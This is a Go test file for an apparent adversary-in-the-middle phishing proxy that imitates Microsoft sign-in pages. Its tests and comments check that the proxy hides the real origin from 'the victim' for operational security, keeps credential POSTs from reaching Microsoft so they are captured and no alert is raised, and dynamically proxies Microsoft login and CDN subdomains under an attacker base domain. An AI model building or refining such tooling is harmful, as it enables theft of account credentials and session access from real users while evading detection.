package proxy

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/user/evilpikin/internal/storage"
)

// TestAssetFallbackRedirectsToRealOrigin proves that when the proxy cannot
// egress to a STATIC asset's real origin, it serves a BUNDLED local copy (so
// images/fonts/media/favicon render) instead of 302-redirecting the victim's
// browser to the genuine origin. The 302-to-real behaviour was removed because
// it leaked the real origin to the victim (an OPSEC gap) and left the asset
// blank whenever the victim's browser also lacked direct CDN egress. JS/CSS are
// deliberately NOT served from a bundle — see TestExecutedAssetNeverRedirected.
func TestAssetFallbackRedirectsToRealOrigin(t *testing.T) {
	engine := NewEngine()
	engine.TLSPort = 9443
	// Intentionally unreachable origin so the upstream fetch fails and the
	// ErrorHandler fallback path is exercised.
	origin := "invalid.invalid"
	tgt := &storage.TargetProfile{
		ID: "t", Name: "t", ProxyHost: "phish.test", Origin: origin,
		Origins: []string{origin}, Enabled: true, ForceHTTPS: true,
	}
	engine.UpsertTarget(tgt)

	h, err := engine.HandlerFor("phish.test")
	if err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest("GET", "http://phish.test/shared/x.svg", nil)
	req.Host = "phish.test"
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)

	// No leak to the real origin: never a 302, and no Location header at all.
	if loc := rec.Header().Get("Location"); loc != "" {
		t.Fatalf("static asset fallback must not leak to real origin, got Location=%q", loc)
	}
	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200 (bundled asset), got %d", rec.Code)
	}
	if ct := rec.Header().Get("Content-Type"); ct == "" {
		t.Fatalf("expected a Content-Type for the bundled asset")
	}
}

// TestPostNotRedirectedToRealOrigin proves credential POSTs are never escaped to
// the real origin (that would bypass capture / alert Microsoft) — they still get
// a bad gateway on upstream failure.
func TestPostNotRedirectedToRealOrigin(t *testing.T) {
	engine := NewEngine()
	engine.TLSPort = 9443
	origin := "invalid.invalid"
	tgt := &storage.TargetProfile{
		ID: "t", Name: "t", ProxyHost: "phish.test", Origin: origin,
		Origins: []string{origin}, Enabled: true, ForceHTTPS: true,
	}
	engine.UpsertTarget(tgt)
	h, err := engine.HandlerFor("phish.test")
	if err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest("POST", "http://phish.test/login", nil)
	req.Host = "phish.test"
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusBadGateway {
		t.Fatalf("expected 502 for POST, got %d (Location=%q)", rec.Code, rec.Header().Get("Location"))
	}
}

// TestExecutedAssetNeverRedirected proves that when the proxy cannot egress to
// an executed asset (JS/CSS), it does NOT 302-redirect to the real cross-origin
// CDN. A cross-origin 302 would run the SPA under the real CDN origin and break
// its same-origin data fetches to the proxy, leaving the page blank. Executed
// content must stay same-origin and fail closed (502) instead.
func TestExecutedAssetNeverRedirected(t *testing.T) {
	engine := NewEngine()
	engine.TLSPort = 9443
	engine.BaseDomain = "test"
	origin := "invalid.invalid"
	tgt := &storage.TargetProfile{
		ID: "t", Name: "t", ProxyHost: "phish.test", Origin: origin,
		Origins: []string{origin}, Enabled: true, ForceHTTPS: true,
	}
	engine.UpsertTarget(tgt)
	h, err := engine.HandlerFor("phish.test")
	if err != nil {
		t.Fatal(err)
	}
	for _, p := range []string{"/bundles/app.js", "/styles/main.css", "/app.woff.js"} {
		req := httptest.NewRequest("GET", "http://phish.test"+p, nil)
		req.Host = "phish.test"
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		if rec.Code != http.StatusBadGateway {
			t.Fatalf("expected 502 for executed asset %q, got %d (Location=%q)", p, rec.Code, rec.Header().Get("Location"))
		}
	}
}

// TestDynamicUnregisteredHostProxiesToRealOrigin proves the proxy reverse-proxies
// the entire ecosystem without pre-listing: any host under the base domain that
// is not in the routing_matrix is derived on the fly by stripping the base-domain
// suffix to recover the real origin. This is what makes CDN/subdomain content
// (aadcdn.msauth.net, passwordreset.microsoftonline.com, go.microsoft.com, ...) load.
func TestDynamicUnregisteredHostProxiesToRealOrigin(t *testing.T) {
	engine := NewEngine()
	engine.TLSPort = 9443
	engine.BaseDomain = "ms.test"

	for _, tc := range []struct{ alias, want string }{
		{"aadcdn.msauth.net.ms.test", "aadcdn.msauth.net"},
		{"passwordreset.microsoftonline.com.ms.test", "passwordreset.microsoftonline.com"},
		{"go.microsoft.com.ms.test", "go.microsoft.com"},
		{"eu-mobile.events.data.microsoft.com.ms.test", "eu-mobile.events.data.microsoft.com"},
	} {
		if _, err := engine.HandlerFor(tc.alias); err != nil {
			t.Fatalf("expected dynamic route for %q: %v", tc.alias, err)
		}
		rr, ok := engine.hostRoutes[strings.ToLower(tc.alias)]
		if !ok {
			t.Fatalf("expected cached route for %q", tc.alias)
		}
		if rr.orig != tc.want {
			t.Fatalf("alias %q -> origin %q, want %q", tc.alias, rr.orig, tc.want)
		}
	}
}
